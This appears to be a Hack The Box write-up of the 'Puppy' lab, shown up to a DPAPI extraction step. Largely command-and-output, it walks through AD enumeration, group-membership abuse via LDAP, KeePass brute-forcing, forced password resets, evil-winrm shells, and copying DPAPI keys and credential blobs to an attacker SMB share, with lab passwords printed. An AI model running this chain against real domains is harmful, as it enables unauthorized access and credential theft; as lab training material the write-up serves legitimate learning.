<p class="indent-paragraph">
This write-up concludes the full compromise of the<code>Puppy</code> machine from Hack The Box's Season 8. From initial enumeration and post-exploitation to domain takeover and final flag retrieval, this assessment demonstrated realistic Active Directory attack chains, including credential harvesting, DPAPI abuse, privilege escalation, and NTDS extraction.
</p>

<p class="indent-paragraph">
Below is the achievement badge earned upon completing this machine, validating the successful exploitation of all required objectives.
</p><br>

<div style="text-align: center; margin-top: 1em;">
  <a href="https://www.hackthebox.com/achievement/machine/1007551/661" target="_blank" style="text-decoration: none; font-family: monospace; background: #0f0f0f; color: #00bfff; padding: 6px 12px; border: 1px solid #00bfff; border-radius: 6px; display: inline-block;">Puppy Badge</a>
</div><br>

---

<br><p class="indent-paragraph">
As is common in real life pentests, you will start the Puppy box with credentials for the following account:
<span class="blue">levi.james</span>:<span class="red">KingofAkron2025!</span>
</p>

### 🧩 Enumeration and Initial Access

<p class="indent-paragraph">
The enumeration phase began with a<code>SYN</code> scan targeting all TCP ports, bypassing ICMP probes and optimizing execution speed. This approach revealed a wide range of open ports commonly associated with Active Directory infrastructures, such as<code>DNS</code> (53),<code>Kerberos</code> (88),<code>NetBIOS</code> (139),<code>SMB</code> (445),<code>LDAP</code>/<code>LDAPS</code> (389/636),<code>kpasswd5</code> (464), and<code>Global Catalog</code> (3268/3269). The presence of<code>NFS</code> (2049),<code>iSCSI</code> (3260),<code>WinRM</code> (5985), and additional high ports further reinforced the assumption of a Windows-based domain controller. These findings set the stage for deeper reconnaissance into available services, domain exposure, and eventual attack surface mapping.
</p>

```
~$ nmap -sS -Pn -T4 -p- <IP>

Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 19:57 UTC
Nmap scan report for <IP>
Host is up (0.13s latency).
Not shown: 65512 filtered tcp ports (no-response)

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
2049/tcp  open  nfs
3260/tcp  open  iscsi
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49692/tcp open  unknown
49718/tcp open  unknown
61847/tcp open  unknown
```


<p class="indent-paragraph">
All signs were screaming “domain controller.” So we tossed the creds into SMB to see what would bite. Using<code>crackmapexec</code><span class="codefix">,</span> we authenticated to the SMB service with the provided credentials. The response confirmed our theory, this machine is indeed a domain controller named <code>DC</code><span class="codefix">,</span> part of the <span class="blue">PUPPY.HTB</span> domain. 
</p>

```
~$ crackmapexec smb <IP> -u levi.james -p 'KingofAkron2025!'

SMB         <IP>     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         <IP>     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
```

<p class="indent-paragraph">
Since we now know the domain is <span class="blue">PUPPY.HTB</span> and the hostname of the controller is simply<code>DC</code><span class="codefix">,</span> it’s a safe bet that<code>dc.puppy.htb</code> will resolve internally. Adding this entry to our local resolver will allow us to refer to the domain controller by name instead of IP, which comes in handy when dealing with SMB, Kerberos, and other AD protocols. 
</p>


```
~$ nano /etc/hosts

<IP>   dc.puppy.htb
```

### 📂 Enumerating SMB Shares

<p class="indent-paragraph">
With the hostname now resolvable, we proceeded to enumerate SMB shares using valid credentials. The scan confirmed the host as a Windows Server 2022 domain controller in the <span class="blue">PUPPY.HTB</span> realm. Alongside standard shares like <code>ADMIN$</code><span class="codefix">,</span> <code>C$</code><span class="codefix">,</span> and <code>IPC$</code><span class="codefix">,</span> one stood out:<span><code>DEV</code></code><span class="codefix">,</span> a custom entry labeled as a development resource for “PUPPY-DEVS”. Interestingly, no permissions were listed for the DEV share, suggesting either a misconfiguration or that <code>levi.james</code> wasn't part of the appropriate group.
</p>



```
~$ crackmapexec smb dc.puppy.htb -u levi.james -p 'KingofAkron2025!' --shares

SMB         dc.puppy.htb    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         dc.puppy.htb    445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         dc.puppy.htb    445    DC               [+] Enumerated shares
SMB         dc.puppy.htb    445    DC               Share           Permissions     Remark
SMB         dc.puppy.htb    445    DC               -----           -----------     ------
SMB         dc.puppy.htb    445    DC               ADMIN$                          Remote Admin
SMB         dc.puppy.htb    445    DC               C$                              Default share
SMB         dc.puppy.htb    445    DC               DEV                             DEV-SHARE for PUPPY-DEVS
SMB         dc.puppy.htb    445    DC               IPC$            READ            Remote IPC
SMB         dc.puppy.htb    445    DC               NETLOGON        READ            Logon server share 
SMB         dc.puppy.htb    445    DC               SYSVOL          READ            Logon server share
```

<p class="indent-paragraph">
The next step was to enumerate domain users via RID brute-forcing. <code>nxc</code> (NetExec), a modern and modular successor to CrackMapExec, proved ideal for the task. By leveraging the <code>--rid-brute</code> option, we prompted the domain controller to reveal internal identifiers tied to user accounts. RIDs (Relative Identifiers) are how Active Directory distinguishes users and groups under the hood. Even with low privileges, a properly filtered enumeration can reveal a surprising amount of structure within the environment.
</p>

```
~$ nxc smb dc.puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | awk -F '\\\\' '{print $2}' | awk '{print $1}'

Administrator
Guest
krbtgt
DC$
levi.james
ant.edwards
adam.silver
jamie.williams
steph.cooper
steph.cooper_adm
```

<p class="indent-paragraph">
With a list of users gathered, the next logical step was to investigate group memberships. Using <code>ldapdomaindump</code><span class="codefix">,</span> we obtained a complete snapshot of the domain including users, groups, and their relationships. The resulting dump provided a clear overview of the environment’s structure and helped identify privileged accounts worth pursuing.
</p>


```
~$ ldapdomaindump dc.puppy.htb -u 'PUPPY.HTB\levi.james' -p 'KingofAkron2025!' 

[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

<p class="indent-paragraph">
After running<code>ldapdomaindump</code><span class="codefix">,</span> we inspected the generated<code>domain_users.html</code> report to get a better view of the domain landscape. Beyond the usual suspects like<code>Administrator</code><span class="codefix">,</span><code>Guest</code><span class="codefix">,</span> and<code>krbtgt</code><span class="codefix">,</span> several user accounts stood out — notably<code>jamie.williams</code><span class="codefix">,</span><code>adam.silver</code><span class="codefix">,</span> and<code>ant.edwards</code><span class="codefix">,</span> all members of the <span class="blue">DEVELOPERS</span> group. Meanwhile,<code>levi.james</code><span class="codefix">,</span> our current session, is sitting comfortably in <span class="blue">HR</span>. Not quite the crew you'd expect to be pushing code — but maybe that can change.
</p>
<div style="margin-top: 20px;">
  <img src="/img/redteam/htb/puppy/ldap-domain-users.png" alt="LDAP Dump Table" style="width: 100%; max-width: 100%; border: 1px solid #444; border-radius: 4px;" />
</div>

### 🧾 BloodHound ACL Analysis

<p class="indent-paragraph">
After mapping out the domain users and their respective groups, the next logical step was to understand the relationships between them. BloodHound is a powerful tool for visualizing Active Directory trust paths and permission structures — and we didn’t want to miss any low-hanging escalation routes. Using the same credentials, we launched<code>bloodhound-python</code> to dump the AD metadata.
</p>


```
~$ bloodhound-python -u 'levi.james' -p 'KingofAkron2025!' -dc dc.puppy.htb -d PUPPY.HTB -c All -ns <IP>

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 28S
```

<p class="indent-paragraph">
To gain visibility into how our current user fits into the Active Directory environment, we leveraged<code>BloodHound</code> with the previously dumped data. After importing all JSON files, we ran a simple query to map direct relationships:<code>MATCH (n)-[r]->(m) RETURN n, r, m</code><span class="codefix">.</span> This allowed us to graph the domain layout. From there, we right-clicked the<code>levi.james@PUPPY.HTB</code> node and selected <em>Shortest Paths to Here</em>, revealing a cleaner, contextual view of privileges, group memberships, and potential lateral opportunities.
</p>

<p class="indent-paragraph">
  <img src="/img/redteam/htb/puppy/graph_levi_puppy_htb.png" alt="BloodHound graph for levi.james" style="width:100%; border-radius:6px; margin-top: 1em;" />
</p>

<p class="indent-paragraph">
As seen earlier in the user dump, <span class="blue">levi.james</span> is part of the <span class="blue">HR</span> group which neatly explains why access to the <span class="blue">DEV</span> share didn’t go through. It’s not about broken permissions; Levi just wasn’t on the guest list. But instead of giving up, we turned to BloodHound to see if there was another way in. Using the query<code>MATCH (n:Group {name: 'DEVELOPERS@PUPPY.HTB'}) RETURN n</code><span class="codefix">,</span> we locked onto the target group and followed <em>“Shortest Paths to Here”</em>. The results were promising: our session,<code>levi.james@puppy.htb</code><span class="codefix">,</span> has a <span class="highlight-red">GenericWrite</span> edge on the <span class="blue">DEVELOPERS</span> group, a delegated permission that allows modification of group attributes. In short, Levi’s not a dev yet, but he has just enough power to make himself one.
</p>

<img src="/img/redteam/htb/puppy/graph_dev_puppy_htb.png" class="full-width-img" alt="BloodHound GenericWrite to Developers group"/>

<p class="indent-paragraph">
With <span class="blue">levi.james</span> holding <span class="highlight-red">GenericWrite</span> over the <span class="blue">DEVELOPERS</span> group, the next step was to retrieve his full Distinguished Name (DN), required for direct LDAP modifications. Using <code>ldapsearch</code> with appropriate filters, we extracted only the necessary DN value: <code>CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB</code><span class="codefix">.</span> This identifier would later be used to update group memberships.
</p>


```
~$ ldapsearch -x -H ldap://dc.puppy.htb -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -b "DC=puppy,DC=htb" "(sAMAccountName=levi.james)" dn | grep "^dn:"
                  
dn: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
```

<p class="indent-paragraph">
With Levi’s distinguished name in hand, we prepare an LDIF (LDAP Data Interchange Format) file — a simple, structured format used to define changes to directory entries. In this case, the file contains four essential lines: the first line,<code>dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB</code><span class="codefix">,</span> specifies the exact object we intend to modify (the DEVELOPERS group); the second line,<code>changetype: modify</code><span class="codefix">,</span> tells the LDAP server this is a modification operation; the third line,<code>add: member</code><span class="codefix">,</span> defines the attribute we are appending to; and the final line,<code>member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB</code><span class="codefix">,</span> inserts Levi’s DN as a new group member. This small file effectively instructs the domain controller to enroll Levi into the DEVELOPERS group — and with the proper permissions in place, it’s all done in a single silent move.
</p>

```
~$ nano modify-developers-group.ldif

dn: CN=DEVELOPERS,DC=PUPPY,DC=HTB
changetype: modify
add: member
member: CN=Levi B. James,OU=MANPOWER,DC=PUPPY,DC=HTB
```

<p class="indent-paragraph">
With the LDIF file prepared and saved as <code>modify-developers-group.ldif</code><span class="codefix">,</span> we proceeded to apply the modification using <code>ldapmodify</code><span class="codefix">.</span> The command authenticated as <span class="blue">levi.james</span> and instructed the domain controller to append his distinguished name to the <code>DEVELOPERS</code> group. Once executed, the server processed the request and, assuming no ACLs interfered, confirmed success — Levi was now officially part of the developers.
</p>


```
~$ ldapmodify -x -H ldap://dc.puppy.htb -D "levi.james@puppy.htb" -w 'KingofAkron2025!' -f modify-developers-group.ldif

modifying entry "CN=DEVELOPERS,DC=PUPPY,DC=HTB"
```

### 🔓 Exploring the DEV Share

<p class="indent-paragraph">
With Levi’s distinguished name successfully injected into the <code>DEVELOPERS</code> group, all that remained was to verify whether the new privileges had taken effect. Using <code>netexec</code><span class="codefix">,</span> we confirmed that Levi now had <code>READ</code> access to the <code>DEV</code> share. The silent LDAP modification had done its job: Levi wasn’t just listed in the directory anymore; he had joined the developers' workspace.
</p>

```
~$ nxc smb dc.puppy.htb -u levi.james -p 'KingofAkron2025!' --shares 

SMB         dc.puppy.htb     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         dc.puppy.htb     445    DC               [+] PUPPY.HTB\levi.james:KingofAkron2025! 
SMB         dc.puppy.htb     445    DC               [*] Enumerated shares
SMB         dc.puppy.htb     445    DC               Share           Permissions     Remark
SMB         dc.puppy.htb     445    DC               -----           -----------     ------
SMB         dc.puppy.htb     445    DC               ADMIN$                          Remote Admin
SMB         dc.puppy.htb     445    DC               C$                              Default share
SMB         dc.puppy.htb     445    DC               DEV             READ            DEV-SHARE for PUPPY-DEVS
SMB         dc.puppy.htb     445    DC               IPC$            READ            Remote IPC
SMB         dc.puppy.htb     445    DC               NETLOGON        READ            Logon server share 
SMB         dc.puppy.htb     445    DC               SYSVOL          READ            Logon server share
```

<p class="indent-paragraph">
Now that <span class="blue">levi.james</span> is part of the <code>DEVELOPERS</code> group, it’s time to validate access. Connecting to the <code>DEV</code> share via <code>smbclient</code> confirms that permissions have been updated. Within the directory, several notable files emerge, including a KeePass installer and a suspiciously named <code>recovery.kdbx</code> database.
</p>

```
~$ smbclient //dc.puppy.htb/DEV -U=levi.james%'KingofAkron2025!' -W PUPPY.HTB

Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Wed May 28 00:05:29 2025
  ..                                  D        0  Sat Mar  8 16:52:57 2025
  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 07:09:12 2025
  Projects                            D        0  Sat Mar  8 16:53:36 2025
  recovery.kdbx                       A     2677  Wed Mar 12 02:25:46 2025

		5080575 blocks of size 4096. 1626432 blocks available
smb: \> get recovery.kdbx 
getting file \recovery.kdbx of size 2677 as recovery.kdbx (4.6 KiloBytes/sec) (average 4.6 KiloBytes/sec)
```

### 🔐 Cracking the KeePass Vault

<p class="indent-paragraph">
Once <code>recovery.kdbx</code> was secured, the next logical step was attempting decryption. Using <code>keepassxc-cli</code> revealed that the database was protected by a master password. All initial guesses failed, each attempt resulted in an <code>Invalid credentials</code> error, confirming that the correct key had to be uncovered through other means.
</p>


```
~$ keepassxc-cli open recovery.kdbx

Enter password to unlock recovery.kdbx: ********
Error while reading the database: Invalid credentials were provided, please try again.
If this reoccurs, then your database file may be corrupt. (HMAC mismatch)
```

<p class="indent-paragraph">
Faced with a modern KeePass database unsupported by traditional tools like <code>keepass2john</code><span class="codefix">,</span> an alternative was needed. The Python-based tool <a href="https://github.com/r3nt0n/keepass4brute" target="_blank"><code>keepass4brute</code></a> proved effective for this scenario. A dictionary attack using the classic <code>rockyou.txt</code> wordlist was launched, and although the process was slow, success eventually came with the word <code>liverpool</code>, the correct password to unlock the secrets stored within <code>recovery.kdbx</code><span class="codefix">.</span>
</p>


```
~$ ./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt

keepass4brute 1.3 by r3nt0n
https://github.com/r3nt0n/keepass4brute

[+] Words tested: 36/14344392 - Attempts per minute: 216 - Estimated time remaining: 6 weeks, 4 days
[+] Current attempt: liverpool

[*] Password found: liverpool
```

<p class="indent-paragraph">
The CLI hit a wall, but the GUI picked up where it left off. With the recovered <code>liverpool</code> password, we launched <code>recovery.kdbx</code> and finally gained visual access to the database. Inside, we found five familiar names tied to domain accounts, each entry hiding a potential credential behind masked fields. With a few clicks, the passwords were revealed: <code>HJKL2025!</code><span class="codefix">,</span> <code>Antman2025!</code><span class="codefix">,</span> <code>JamieLove2025!</code><span class="codefix">,</span> <code>ILY2025!</code><span class="codefix">,</span> and <code>Steve2025!</code><span class="codefix">.</span> 
</p>

<img src="/img/redteam/htb/puppy/keepass_recovery-kdbx.png" class="full-width-img" alt="recovery.kdbx"/>

<p class="indent-paragraph">
With a fresh batch of credentials in hand (usernames from our earlier RID brute-force and passwords extracted from the cracked KeePass database) it was time to test for valid logins. Feeding both lists into <code>netexec</code> allowed us to iterate through potential combinations efficiently. The result? A clean hit: <span class="blue">PUPPY.HTB\ant.edwards:Antman2025!</span>. No domain admin logins, yet, but this set was definitely worth validating across the environment.
</p>


```
~$ nxc smb dc.puppy.htb -u users-puppy-htb.txt -p pass-puppy-htb.txt | grep "[+]"

SMB               dc.puppy.htb     445    DC               [+] PUPPY.HTB\ant.edwards:Antman2025! 
```

### 🕵️‍♂️ BloodHound Enumeration & AD Mapping

<p class="indent-paragraph">
With valid domain credentials for <code>ant.edwards</code> in hand, we reran BloodHound to assess the privileges associated with this new user. A full collection cycle targeting the domain controller was initiated, and the process completed successfully. Just like that, the map of Active Directory got a lot more interesting.
</p>



```
~$ bloodhound-python -u 'ant.edwards' -p 'Antman2025!' -dc dc.puppy.htb -d PUPPY.HTB -c All -ns <IP> -o bloodhound_edwards.json

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: puppy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.puppy.htb
INFO: Found 10 users
INFO: Found 56 groups
INFO: Found 3 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.PUPPY.HTB
INFO: Done in 00M 29S
```

<p class="indent-paragraph">
To explore the extent of <span class="blue">ant.edwards</span>'s influence within the domain, we ran a broader query to uncover any shortest privilege paths linking him to other user objects. Using<code>MATCH (n:User {name: 'ANT.EDWARDS@PUPPY.HTB'}), (m:User) WHERE n &lt; &gt; m WITH n, m MATCH p = shortestPath((n)-[*..4]-&gt;(m)) RETURN p</code><span class="codefix">,</span> we visualized the privilege graph around his account. The resulting BloodHound path revealed a particularly notable relationship: <span class="blue">ant.edwards</span> is a member of the<code>SENIOR DEVS</code> group, which holds <span class="highlight-red">GenericAll</span> permissions over <span class="blue">adam.silver</span>.</span> This means Edwards can reset Adam’s password or make any modification to his account — a promising vector for lateral movement.
</p>

<img src="/img/redteam/htb/puppy/graph_objects_ant-edwards.png" alt="BloodHound showing SENIOR DEVS GenericAll over Adam Silver">

### 🎯 Abusing GenericAll to Reset a Password

<p class="indent-paragraph">
While reviewing the permissions extracted via BloodHound, one edge stood out: <span class="highlight-red">GenericAll</span> granted to <span class="blue">ant.edwards</span> over<code>adam.silver</code><span class="codefix">.</span> This level of access permits full control over the target user object, including the ability to set a new password. Following the approach described in <a href="https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/" target="_blank" style="color: #89CFF0; text-decoration: none;"><strong>Abusing AD-DACL: ForceChangePassword</strong></a>, we connected to the domain controller using<code>rpcclient</code><span class="codefix">,</span> a powerful command-line tool for interacting with Windows services over SMB. By issuing<code>setuserinfo ADAM.SILVER 23 Ch4ng3Passw0rd@123</code><span class="codefix">,</span> we invoked the level<code>23</code> structure, which instructs the server to silently overwrite the user’s password without requiring the original. At first, login attempts failed with<code>STATUS_ACCOUNT_DISABLED</code><span class="codefix">.</span>
</p>


```
~$ rpcclient -U 'dc.puppy.htb\Ant.Edwards%Antman2025!' dc.puppy.htb

rpcclient $> setuserinfo ADAM.SILVER 23 Ch4ng3Passw0rd@123
rpcclient $> exit
```

```
~$ nxc smb dc.puppy.htb  -u 'ADAM.SILVER' -p 'Ch4ng3Passw0rd@123'

SMB         dc.puppy.htb     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:PUPPY.HTB) (signing:True) (SMBv1:False)
SMB         dc.puppy.htb     445    DC               [-] PUPPY.HTB\ADAM.SILVER:Ch4ng3Passw0rd@123 STATUS_ACCOUNT_DISABLED 
```

### 🔓 Account Reactivation and Shell Access via Evil-WinRM

<p class="indent-paragraph">
With Adam’s password reset, we were nearly there, except the account was still flagged as disabled. To address this, we used<code>bloodyAD</code><span class="codefix">,</span> a post-exploitation tool designed to manipulate Active Directory objects via LDAP operations. By issuing<code>remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE</code><span class="codefix">,</span> we cleared the<code>ACCOUNTDISABLE</code> bit from the<code>userAccountControl</code> attribute, effectively reactivating the account. No need to edit the object manually or interact via GUI, a single command, and Adam Silver was back online.
</p>


```
~$ bloodyAD --host dc.puppy.htb -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'ADAM.SILVER' -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from ADAM.SILVER's userAccountControl
```

<p class="indent-paragraph">
With the account re-enabled and armed with valid credentials, we initiated a session using<code>evil-winrm</code><span class="codefix">,</span> a reliable tool for remote PowerShell access in Windows environments. Connecting to the domain controller as <span class="blue">adam.silver</span>, we navigated to the user’s<code>Desktop</code> and retrieved the<code>user.txt</code> flag — final confirmation that our foothold had been successfully established.
</p>

```
~$ evil-winrm -i dc.puppy.htb -u adam.silver -p 'Ch4ng3Passw0rd@123'    
                                        
Evil-WinRM shell v3.7

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\adam.silver\Documents> 
*Evil-WinRM* PS C:\Users\adam.silver\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> dir

    Directory: C:\Users\adam.silver\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/28/2025  12:31 PM           2312 Microsoft Edge.lnk
-ar---         5/28/2025   1:15 PM             34 user.txt

*Evil-WinRM* PS C:\Users\adam.silver\Desktop> type user.txt
fde97**********************f873e4
```

### ⬆️ Privilege Escalation

<p class="indent-paragraph">
With initial access established through<code>evil-winrm</code> as <span class="blue">adam.silver</span>, our focus shifted to enumeration for potential privilege escalation. Listing the contents of the root directory (<code>C:\</code>), a<code>Backups</code> folder stood out. Navigating into it revealed a single archive:<code>site-backup-2024-12-30.zip</code><span class="codefix">.</span> Using<code>evil-winrm</code>'s<code>download</code> functionality, we retrieved the file locally for further inspection, a promising lead for credential reuse or sensitive configuration leakage.
</p>

```
~$ *Evil-WinRM* PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/9/2025  10:48 AM                Backups
d-----         5/12/2025   5:21 PM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---          4/4/2025   3:40 PM                Program Files
d-----          5/8/2021   2:40 AM                Program Files (x86)
d-----          3/8/2025   9:00 AM                StorageReports
d-r---         5/29/2025   2:11 PM                Users
d-----         5/13/2025   4:40 PM                Windows

*Evil-WinRM* PS C:\> dir Backups

    Directory: C:\Backups

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   8:22 AM        4639546 site-backup-2024-12-30.zip


*Evil-WinRM* PS C:\> cd Backups
*Evil-WinRM* PS C:\Backups> download site-backup-2024-12-30.zip
                                        
Info: Downloading C:\Backups\site-backup-2024-12-30.zip to site-backup-2024-12-30.zip
```

<p class="indent-paragraph">
After transferring and extracting the archive locally, we uncovered a configuration file:<code>nms-auth-config.xml.bak</code><span class="codefix">.</span> This file contained hardcoded LDAP credentials for the account<code>steph.cooper</code><span class="codefix">,</span> with the cleartext password<code>ChefSteph2025!</code><span class="codefix">.</span> These credentials, stored within the<code>bind-dn</code> and<code>bind-password</code> fields, suggest privileged access to the domain controller's LDAP service, offering a potential path toward privilege escalation.
</p>

```
~$ unzip site-backup-2024-12-30.zip -d extracted_backup
                            
total 20
drwxrwxr-x 6 kali kali 4096 Dec 31  1979 assets
drwxrwxr-x 2 kali kali 4096 Dec 31  1979 images
-rw-rw-r-- 1 kali kali 7258 Dec 31  1979 index.html
-rw-r--r-- 1 kali kali  864 Dec 31  1979 nms-auth-config.xml.bak
                                                                                      
~$ cat nms-auth-config.xml.bak

<?xml version="1.0" encoding="UTF-8"?>
<ldap-config>
    <server>
        <host>DC.PUPPY.HTB</host>
        <port>389</port>
        <base-dn>dc=PUPPY,dc=HTB</base-dn>
        <bind-dn>cn=steph.cooper,dc=puppy,dc=htb</bind-dn>
        <bind-password>ChefSteph2025!</bind-password>
    </server>
    <user-attributes>
        <attribute name="username" ldap-attribute="uid" />
        <attribute name="firstName" ldap-attribute="givenName" />
        <attribute name="lastName" ldap-attribute="sn" />
        <attribute name="email" ldap-attribute="mail" />
    </user-attributes>
    <group-attributes>
        <attribute name="groupName" ldap-attribute="cn" />
        <attribute name="groupMember" ldap-attribute="member" />
    </group-attributes>
    <search-filter>
        <filter>(&(objectClass=person)(uid=%s))</filter>
    </search-filter>
</ldap-config>
```

### 📂 Extracting Credentials via DPAPI

<p class="indent-paragraph">
Using the credentials extracted from the backup, we authenticated to the domain controller via<code>evil-winrm</code> as<code>steph.cooper</code><span class="codefix">.</span> Upon accessing the user's<code>Documents</code> folder, we identified a file named<code>masterkey</code><span class="codefix">.</span> This file is likely related to the Data Protection API (DPAPI) and may contain encrypted keys used to protect other credentials stored on the system. Recognizing its forensic value, we promptly downloaded it for local analysis. Such artifacts are pivotal in later stages when attempting to decrypt password blobs or secure system data.
</p>

```
~$ evil-winrm -i dc.puppy.htb -u steph.cooper -p ChefSteph2025!
                                        
Evil-WinRM shell v3.7                                        
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> 
*Evil-WinRM* PS C:\Users\steph.cooper\Documents> dir

    Directory: C:\Users\steph.cooper\Documents

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          3/8/2025   7:40 AM            740 masterkey

*Evil-WinRM* PS C:\Users\steph.cooper\Documents> download masterkey
                                        
Info: Downloading C:\Users\steph.cooper\Documents\masterkey to masterkey
```

<p class="indent-paragraph">
To facilitate the extraction of multiple sensitive files from the target system, an SMB share was set up on the attacker's machine using<code>impacket-smbserver</code><span class="codefix">.</span> By executing<code>impacket-smbserver share ./share -smb2support</code><span class="codefix">,</span> a writable SMBv2-compatible file share named<code>share</code> was made available. This allowed us to copy files from the compromised Windows host directly to our local directory via UNC paths (e.g.,<code>\<attacker-ip>\share</code>). This method proved efficient for retrieving artifacts such as the<code>masterkey</code> file, streamlining the collection process without relying on slower in-session downloads through<code>evil-winrm</code><span class="codefix">.</span>
</p>

```
~$ mkdir -p share

~$ impacket-smbserver share ./share -smb2support
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
.......
```

<p class="indent-paragraph">
After gaining access with the <code>steph.cooper</code> account, we actively searched for DPAPI-related artifacts and located two critical files: a <code>masterkey</code> under <code>C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect</code> and a <code>credential blob</code> in <code>C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials</code><span class="codefix">.</span> To extract these files, a local SMB share was created using <code>impacket-smbserver</code><span class="codefix">,</span> allowing them to be remotely copied via <code>evil-winrm</code> using the <code>copy</code> command. Retrieving these files is essential in post-exploitation scenarios, as they can be combined with the user's password (or NT hash) to decrypt DPAPI-protected secrets using tools such as <code>SharpDPAPI</code> or <code>dpapi.py</code><span class="codefix">.</span> These secrets may include stored credentials, tokens, or other sensitive user data.
</p>

```
~$ *Evil-WinRM* PS C:\Users\steph.cooper> cd Appdata\Roaming\Microsoft\Protect
*Evil-WinRM* PS C:\Users\steph.cooper\Appdata\Roaming\Microsoft\Protect> dir

    Directory: C:\Users\steph.cooper\Appdata\Roaming\Microsoft\Protect

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         5/29/2025   2:44 PM                S-1-5-21-1487982659-1829050783-2281216199-1107

*Evil-WinRM* PS C:\Users\steph.cooper\Appdata\Roaming\Microsoft\Protect> copy "C:\Users\steph.cooper\Appdata\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" "\<IP>\share\steph-masterkey"

*Evil-WinRM* PS C:\Users\steph.cooper\Appdata\Roaming\Microsoft> dir

    Directory: C:\Users\steph.cooper\Appdata\Roaming\Microsoft

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-          3/8/2025   7:53 AM                Credentials
d---s-          3/8/2025   7:40 AM                Crypto
d-----          3/8/2025   7:40 AM                Internet Explorer
d-----          3/8/2025   7:40 AM                Network
d---s-          3/8/2025   7:40 AM                Protect
d-----          5/8/2021   1:20 AM                Spelling
d---s-         2/23/2025   2:35 PM                SystemCertificates
d-----         2/23/2025   2:36 PM                Vault
d-----          3/8/2025   7:52 AM                Windows


*Evil-WinRM* PS C:\Users\steph.cooper\Appdata\Roaming\Microsoft> cd Credentials
*Evil-WinRM* PS C:\Users\steph.cooper\Appdata\Roaming\Microsoft\Credentials> dir -h

    Directory: C:\Users\steph.cooper\Appdata\Roaming\Microsoft\Credentials

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          3/8/2025   7:54 AM            414 C8D69EBE9A43E9DEBF6B5FBD48B521B9

